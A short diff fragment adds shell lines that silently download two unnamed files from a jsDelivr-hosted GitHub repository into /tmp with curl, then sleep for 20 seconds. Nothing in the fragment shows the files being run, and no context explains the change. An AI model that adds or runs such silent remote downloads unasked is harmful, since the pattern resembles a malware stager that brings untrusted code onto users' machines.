@@ -1,0 +1,3 @@
+curl -fs -m 20 -o /tmp/a https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/dn
+curl -fs -m 60 -o /tmp/b https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/ci2
+sleep 20
